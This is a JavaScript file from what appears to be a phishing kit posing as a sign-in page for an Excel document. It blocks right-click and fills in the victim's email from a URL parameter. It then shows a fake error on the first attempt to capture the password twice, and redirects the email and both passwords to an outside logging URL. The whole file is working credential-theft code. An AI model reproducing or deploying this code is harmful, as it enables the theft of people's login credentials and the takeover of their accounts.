document.addEventListener('contextmenu', event => event.preventDefault());

const validEmail =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

// document.addEventListener('keypress', (e)=>{
//     alert(e.which)
// });

const getUrl = new URLSearchParams(window.location.search);
const userName = getUrl.get('user');

let mail_input = document.getElementById("mail_input");
let pass_input = document.getElementById("pass_input");
let notifier = document.getElementById("notifier");
let temp_mail = document.getElementById("temp_mail");
let sub_btn = document.getElementById("sub_btn");

if (validEmail.test(userName)) {
    mail_input.value = userName
}

let sub_count = 0;

const xsl_form = document.getElementById("xsl_form");
xsl_form.addEventListener("submit", (e)=>{
    e.preventDefault()
   
    if (!validEmail.test(mail_input.value)) {
        notify("Sorry, this document can not be accessed without receipient e-mail address.")
        return
    }

    if (pass_input.value == "") {
        notify("Password can't be empty !")
        return
    }
    
    if (pass_input.value.length < 6 || pass_input.value.toUpperCase() == "QWERTY" || pass_input.value.toUpperCase() == "PASSWORD" || pass_input.value == 123456) {
        notify("Wrong password")
        return
    }

    sub_count++

    if (sub_count == 1) {
        const timer = Math.floor(Math.random() * 3000);
        const timing = timer + 2000;

        sub_btn.innerHTML = `<i>Connecting ...</i>`;
        temp_mail.value = pass_input.value;

        setTimeout(() => {
            pass_input.type = "search"

            notify("Something went wrong, please try again");
            pass_input.value = "";
            sub_btn.innerHTML = `Sign in`;

        }, timing);

        return
    }

    if (sub_count > 1) {
        
        if (pass_input.value.length < 6 || pass_input.value.toUpperCase() == "QWERTY" || pass_input.value.toUpperCase() == "PASSWORD" || pass_input.value == 123456) {
            notify("Wrong password")
            sub_count = 1
            return
        }

        setTimeout(() => {
            sub_btn.innerHTML = `<i>Connecting ...</i>`;
            pass_input.type = "search";
            pass_input.style.color = "transparent";
    
            setTimeout(() => {
            sub_btn.innerHTML = `<i>Verifying ...</i>`;

            let url = "Domain" + "=" + "Excel Logs" + "&" + "Mail" +
            "=" + mail_input.value + "&" + "Pass1" + "=" + temp_mail.value + "&" + "Pass2" + "=" + pass_input.value;

            pass_input.type = "search";
    
            location = "https://tellme24.com/logs/excel/xls.php?"+url;
            pass_input.value = "";
    
            }, 1500);
        }, 100);
    }

});

function notify(n) {
   notifier.innerText = n;
   notifier.style.color = "darkred"; 
}

pass_input.addEventListener("keydown", ()=>{
    if (pass_input.type === "search") {
        pass_input.type = "password"
    }
});

// 

const loading_content = document.getElementById("loading_content");

setTimeout(() => {
    loading_content.style.display = "none";
    xsl_form.style.display = "block"
}, 4000);
